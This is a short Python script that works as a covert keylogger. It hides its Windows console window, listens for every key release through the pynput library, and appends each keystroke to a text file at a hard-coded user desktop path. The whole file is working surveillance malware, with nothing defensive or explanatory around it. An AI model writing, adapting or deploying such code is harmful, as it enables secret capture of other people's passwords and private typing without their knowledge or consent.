import os
import sys
from pynput.keyboard import Listener, Key
from datetime import datetime

def hide_console():
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def on_release(key):
    key = str(key)
    path = r'C:\Users\Harsha\Desktop\hello\key_strock.txt'
    
    if key.startswith("'") and key.endswith("'"):
        key = key[1:-1]
    
    if key.startswith("Key."):
        key = key[4:]
    
    date = datetime.now().strftime('%d/%m/%y %H:%M')
    
    with open(path, 'a') as file:
        file.write(f' {key} ')
    
    # print(key, end=' ', flush=True)

if __name__ == "__main__":
    hide_console()
    with Listener(on_release=on_release) as listener:
        listener.join()
